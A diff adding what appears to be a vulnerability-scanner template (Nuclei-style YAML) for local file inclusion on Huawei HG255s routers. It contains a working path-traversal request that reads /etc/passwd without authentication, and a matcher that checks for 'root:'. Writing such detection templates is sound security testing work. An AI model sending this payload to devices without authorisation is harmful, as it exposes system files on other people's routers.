@@ -1,0 +1,25 @@
+id: huawei-hg255s-lfi
+
+info:
+  name: Huawei HG255s Local File Inclusion
+  author: kamerka-fork
+  severity: high
+  description: |
+    Huawei HG255s routers are vulnerable to local file inclusion
+    allowing unauthenticated access to sensitive files on the device.
+  tags: china-iot,huawei,lfi
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/css/..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "root:"
